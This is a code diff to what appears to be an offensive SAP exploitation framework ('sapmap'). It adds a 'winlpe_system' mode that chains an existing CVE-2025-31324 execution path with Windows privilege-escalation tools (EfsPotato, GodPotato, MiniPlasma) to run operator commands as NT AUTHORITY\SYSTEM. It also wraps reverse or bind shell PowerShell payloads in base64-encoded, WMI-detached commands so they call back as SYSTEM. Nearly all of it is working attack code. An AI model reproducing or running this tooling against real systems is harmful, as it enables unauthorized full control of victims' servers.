@@ -6546,6 +6546,29 @@ def create_app(api: SAPMAPApi) -> Bottle:
             # otherwise fall back to the blind Runtime.exec gadget.
             full = (command + (" " + params if params else "")).strip()
             result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, full)
+        elif method == "winlpe_system":
+            # Elevate to NT AUTHORITY\\SYSTEM via the Windows-LPE picker
+            # (EfsPotato preferred, GodPotato fallback, MiniPlasma as a
+            # last resort).  The picker delivers + runs the chosen
+            # binary on the target, which spawns the operator command
+            # under a SYSTEM token and pipes stdout back.
+            from sapmap_winlpe_auto import run_windows_lpe
+            full = cmdline if cmdline else (
+                command + (" " + params if params else "")).strip()
+            if not full:
+                return json.dumps({"error": "No command for winlpe_system"})
+            print(f"[*] {sid}: OS terminal — routing through Windows LPE "
+                  f"for SYSTEM context (cmd: {full[:80]!r})")
+            lpe_res = run_windows_lpe(node, full)
+            # Adapter: run_windows_lpe returns {ok, stdout, method, error};
+            # exec_command callers expect {success, output, error}.
+            result = {
+                "success": bool(lpe_res.get("ok")),
+                "output": (lpe_res.get("stdout") or "").splitlines() or [
+                    "(no output)" if lpe_res.get("ok") else ""],
+                "error": lpe_res.get("error") or "",
+                "winlpe_method": lpe_res.get("method", ""),
+            }
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
 
@@ -6712,6 +6735,74 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     _set_progress("Executing payload (single-shot)...")
                     result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                         node, full_cmd, timeout=45.0)
+            elif method == "winlpe_system":
+                # Spawn the shell payload as NT AUTHORITY\\SYSTEM via the
+                # Windows-LPE picker.  Reuses the same WMI-detached
+                # PowerShell wrapper the cve_31324 path constructs (so
+                # the spawned reverse/bind shell inherits no handles
+                # from the EfsPotato/GodPotato parent and survives the
+                # LPE binary's WaitForExit completing).  The picker
+                # then runs the wrapper as SYSTEM, the wrapper
+                # Win32_Process.Create's the inner reverse/bind
+                # PowerShell (which inherits the SYSTEM token because
+                # WMI Create-from-SYSTEM passes through the caller's
+                # token by default), and the inner shell connects
+                # back / listens AS SYSTEM.
+                raw_ps = payload.get("raw_ps_script")
+                if not raw_ps:
+                    print(f"[-] {sid}: winlpe_system shell needs a "
+                          f"Windows PowerShell payload (raw_ps_script "
+                          f"missing) - target may not be Windows")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = (
+                                "winlpe_system requires a Windows target "
+                                "with a PowerShell payload")
+                    return
+
+                _set_progress(
+                    "Wrapping shell payload for SYSTEM elevation "
+                    "(WMI-detached Win32_Process.Create)...")
+                import base64 as _b64s
+                inner_enc = _b64s.b64encode(
+                    raw_ps.encode("utf-16-le")).decode("ascii")
+                # Same WMI-detached wrapper as the cve_31324 path.  When
+                # the wrapper is run as SYSTEM (via EfsPotato), the
+                # Win32_Process.Create inherits the SYSTEM token, so the
+                # inner reverse/bind PowerShell runs as SYSTEM too.
+                wrapper_ps = (
+                    f'[void]([wmiclass]"Win32_Process").Create('
+                    f'"powershell.exe -NoProfile '
+                    f'-EncodedCommand {inner_enc}")'
+                )
+                outer_enc = _b64s.b64encode(
+                    wrapper_ps.encode("utf-16-le")).decode("ascii")
+                full_cmd = (f"powershell.exe -NoProfile "
+                            f"-EncodedCommand {outer_enc}")
+
+                _set_progress("Routing payload through Windows LPE "
+                              "for SYSTEM elevation (delivers EfsPotato/"
+                              "GodPotato binary + runs payload as SYSTEM)...")
+                from sapmap_winlpe_auto import run_windows_lpe
+                lpe_res = run_windows_lpe(node, full_cmd)
+                # Adapter to the {success, output, error} shape the
+                # rest of the shell-start flow expects.
+                result = {
+                    "success": bool(lpe_res.get("ok")),
+                    "output": (lpe_res.get("stdout") or "").splitlines() or [
+                        f"(SYSTEM payload dispatched via "
+                        f"{lpe_res.get('method', '?')})"
+                    ],
+                    "error": lpe_res.get("error", ""),
+                }
+                if not result["success"]:
+                    print(f"[-] {sid}: winlpe_system shell dispatch "
+                          f"failed: {result['error']}")
+                else:
+                    print(f"[+] {sid}: SYSTEM shell payload spawned "
+                          f"via {lpe_res.get('method')}; expect "
+                          f"connection as NT AUTHORITY\\SYSTEM")
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
